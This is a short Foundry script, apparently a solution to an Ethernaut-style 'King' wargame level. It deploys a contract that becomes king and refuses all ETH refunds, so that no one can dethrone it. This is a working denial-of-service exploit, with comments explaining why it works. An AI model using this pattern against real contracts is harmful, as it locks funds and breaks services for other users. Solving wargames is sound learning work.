// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/9_King.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";


/*
* Why two funciton ?
*    what happens we only use 1 contract ?
* -> If we just use one contract then msg.sender is our address.
*    If msg.sender is our address then they can pay us Eth to proclaim  themself as king or owner can sender can just proclaim.
* -> If we use contract then we can refuse Eth so even if they try to proclaim by sending us Eth or via Owner then. we can refuse payment and they cannot over throw us.
*/

// # LastKing contract is not payable
contract LastKing {
    constructor(King _kingAddr) payable {
        address(_kingAddr).call{value: _kingAddr.prize()}("");
    }
}


contract ProclaimKingship is Script {
    King public king = King(payable(0x33DDE5E76EB77d2933295295dCf94E6d48a9a3A3));
    
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // //LastKing.call{value: king.prize()}(king);
        // we are deploying LastKing contract form this contract 
        // we are not sending eth to this contract.
        new LastKing{value: king.prize()}(king);
        
        vm.stopBroadcast();
    }
}
